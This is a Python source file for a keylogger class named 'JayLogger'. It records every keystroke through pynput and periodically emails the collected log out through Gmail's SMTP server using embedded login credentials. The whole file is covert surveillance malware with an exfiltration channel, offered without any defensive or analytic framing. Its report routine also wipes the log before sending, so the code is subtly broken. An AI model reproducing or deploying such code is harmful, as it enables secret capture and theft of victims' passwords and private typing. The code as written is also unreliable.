import pynput.keyboard, threading, smtplib



log = ''
class JayLogger:
    def __init__(self, intervalTime, email, password):
        self.log = ""
        self.interval = intervalTime
        self.email = email
        self.password = password


    def appendToKey(self, string):
        self.log = self.log + string



    def processKeyStrike(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.appendToKey(current_key)


    def report(self):
        self.log = ' '
        print(self.log)
        self.sendMail(self.email, self.password, "\n\n" + self.log)
        timer = threading.Timer(self.interval, self.report)
        timer.start()


    def sendMail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyListener = pynput.keyboard.Listener(on_press=self.processKeyStrike)
        with keyListener:
            self.report()
            keyListener.join()